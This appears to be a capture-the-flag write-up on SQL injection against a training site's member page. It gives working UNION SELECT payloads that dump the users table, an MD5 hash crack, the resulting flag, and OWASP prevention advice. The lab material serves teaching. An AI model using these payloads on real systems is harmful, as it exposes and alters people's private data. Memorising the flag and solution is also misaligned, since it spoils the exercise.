# SQL INJECTION MEMBERS

## Flag
```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Discovery
On the page http://{IP_ADDRESS}/index.php?page=member

```diff
# To get the request columns number
1 OR 1=1 UNION SELECT NULL, NULL--
> 2 columns

# To get the users columns names
1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
> user_id, first_name, last_name, town, country, planet, Commentaire, countersign

# To see all user's data
1 AND 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
> user_id = 5
> FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28

# Finally "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
md5_decrypt('5ff9d0165b4f92b14994e5c685cdce28')
> FortyTwo
lower('FortyTwo')
> fortytwo
sh256('fortytwo')
> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Use
> read sensitive data from the database, \
> modify database data (Insert/Update/Delete), \
> execute administration operations on the database (such as shutdown the DBMS), \
> recover the content of a given file present on the DBMS file system \
> and in some cases issue commands to the operating system

## Prevention
> Use of Prepared Statements (with Parameterized Queries) \
> Use of Stored Procedures \
> Whitelist Input Validation \
> Escaping All User Supplied Input

## Documentation
- [owasp - SQL injection](https://www.owasp.org/index.php/SQL_Injection)
- [owasp - prevent SQL injection](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [md5](https://md5decrypt.net/en/)

---

[RETURN](https://github.com/tillderoquefeuil/darkly)